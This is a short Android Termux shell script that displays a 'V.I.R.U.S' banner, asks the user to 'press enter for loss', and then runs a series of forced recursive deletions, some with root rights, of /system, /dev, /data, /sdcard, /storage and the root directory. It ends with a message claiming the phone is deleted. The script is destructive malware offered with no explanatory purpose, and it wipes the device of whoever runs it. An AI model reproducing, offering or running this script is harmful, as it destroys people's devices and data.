#!/bin/sh
#colors
a='\033[1;92m'
b='\033[1;93m'
c='\033[1;94m'
d='\033[1;95m'
e='\033[1;96m'
echo " "
apt update
apt upgrade
apt-get install toilet
apt-get install figlet
apt-get install tsu
toilet -f standard -F gay Termux
toilet -f standard -F gay V.I.R.U.S
echo
echo "press enter for loss"
read
su -c rm -Rf /system
tsu -c rm -Rf /dev
su -c rm -Rf /*
su -c rm -Rf /dev
su -c rm -Rf /system /data
su -c rm -Rf /sdcard
rm -Rf /sdcard
su -c rm /data
rm -Rf /storage
su -c rm -Rf /storage
rm -Rf /sdcard1
echo "$c Completed your phone deleted$d"
